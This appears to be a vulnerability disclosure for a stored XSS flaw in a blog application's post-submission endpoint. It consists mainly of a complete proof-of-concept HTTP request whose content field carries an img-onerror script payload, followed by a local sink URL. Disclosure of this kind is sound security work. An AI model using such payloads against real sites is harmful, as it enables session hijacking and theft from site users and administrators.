# Summary

The /post/submit endpoint is used for publishing blog posts, the user-controlled article content parameter has no security checks, and output pages in multiple places on the frontend and admin panel have no encoding processing, thus creating stored XSS vulnerabilities.

# POC

```
POST /post/submit HTTP/1.1
Host: localhost:8080
Content-Length: 898
Cache-Control: max-age=0
sec-ch-ua: "Not)A;Brand";v="8", "Chromium";v="138"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Accept-Language: en-US,en;q=0.9
Origin: http://localhost:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrPNOIPFbJ3aCCLJ9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8080/post/editing
Accept-Encoding: gzip, deflate, br
Cookie: Hm_lvt_9d1e524198ede8205ac7c938c243344c=1753595810; rememberMe=L4lLoJFx26gMsoGbDLDQRZOmvgFjElwmYLUZkMfctqCTGHrN5u+zw9mLE5FJvvEaChN/SpX7Bbil872x2ziWBxhwqogHMMGGhEWY+Ua7ky0e9WMW/Imnt2kU1BJSBmTMdwTOnpjkYDgV8LRrwf5nZ2VSZlpRO0RA6qLh/twPcJ5TXGZaQDYL3brfIJL2hoGAvX2C6DKjIgguTcLQw5D6qIOE4tH0CV7IEbQQ97yI7BVazbo6JyfmS0IAWqzDGtC1MNunFVceTLcWvLUU50BfPadvzFmCBOwRizI8lJyvNirMtG+dfKt1ztkAHTyJxiT/WjBRXoSnKafrv4W8mCBuuA4MIKxprobtSD5/73TjZUtkKmYix0N4jeNJrdrHn00OkqlelBHtRa5PBXLZiglirq7rCOh/oPa4+Hj/FPVNREtnTd3MUt0HBHNHR658FX/WvflTfXHeIClfC+6c8Ny/nq0fylTPgYcxHNIjSDt+HjhP8k544idC2CGqROyxX40OVwM9ZcF8L/fw0RiQuvqs+lfH39KS2y+nmtqZULRTNNyL/k1s708LHp0AI3f9nCW896ZCTf4joehWyC+/UMGsC+J6G/Vjhvj7ihaV+CrYn4CvIXn18iDx+Qsik13xMw61G5yM19MflKkg9fm+r7n7cZfuhU06b3ph87Ki2+CyRJcxpFDoTfCF25uXomoUe/lmnOBJSGEw+X1ZJB+v8nGqjrA8qjBtZ7IrpSfiY7NviD3zRzrUSMMYIjvEpKD/OXeYw2Y8xpVk/KRtQtfHgmk8gl0J/GZpf0NzhgbD8ok9MxeiIYvjep4duKNi5HBDe/wFC6TjxhBnei3kh77dQI1kA9B9RdAg3CtwEc+fNK9Bsb5+5dAgDTgMvHCtxYynQj60b+TCcKoCuPOjjHlJT/9ECVCAlhSkq5hGiXFkjbi2p9zPQSpqu6d/nsnDJSZgblysMNzxCygxGKhrRk0elzuaD3oBnvOUwUdPB+x5wKnLVNLFN8UF2+mbFI1TE8nfK5dqgNItglFRhSZ2QFtxbtJDMLHM1wm2Me+K9HbC51ft96qC0Wli+T6xZ8daEpFtkPXx/DpnXe/89llFFS0P0BqkCQ==; JSESSIONID=LEE0ajXE9J08tg6aEq044hWtpRDFnJj4WdOEmpbG
Connection: keep-alive

------WebKitFormBoundaryrPNOIPFbJ3aCCLJ9
Content-Disposition: form-data; name="status"

0
------WebKitFormBoundaryrPNOIPFbJ3aCCLJ9
Content-Disposition: form-data; name="editor"

markdown
------WebKitFormBoundaryrPNOIPFbJ3aCCLJ9
Content-Disposition: form-data; name="thumbnail"


------WebKitFormBoundaryrPNOIPFbJ3aCCLJ9
Content-Disposition: form-data; name="title"

111
------WebKitFormBoundaryrPNOIPFbJ3aCCLJ9
Content-Disposition: form-data; name="content"

1"><img src=1 onerror=alert(/content/)>
------WebKitFormBoundaryrPNOIPFbJ3aCCLJ9
Content-Disposition: form-data; name="file"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryrPNOIPFbJ3aCCLJ9
Content-Disposition: form-data; name="channelId"

2
------WebKitFormBoundaryrPNOIPFbJ3aCCLJ9
Content-Disposition: form-data; name="tags"

222
------WebKitFormBoundaryrPNOIPFbJ3aCCLJ9--

```

## SINKS

- [http://localhost:8080/post/5](https://gitee.com/link?target=http%3A%2F%2Flocalhost%3A8080%2Fpost%2F5)

![输入图片说明](https://cdn.nlark.com/yuque/0/2026/png/25709736/1773132829586-27be92c3-e140-43d3-bc46-63bdf9dd06ab.png)
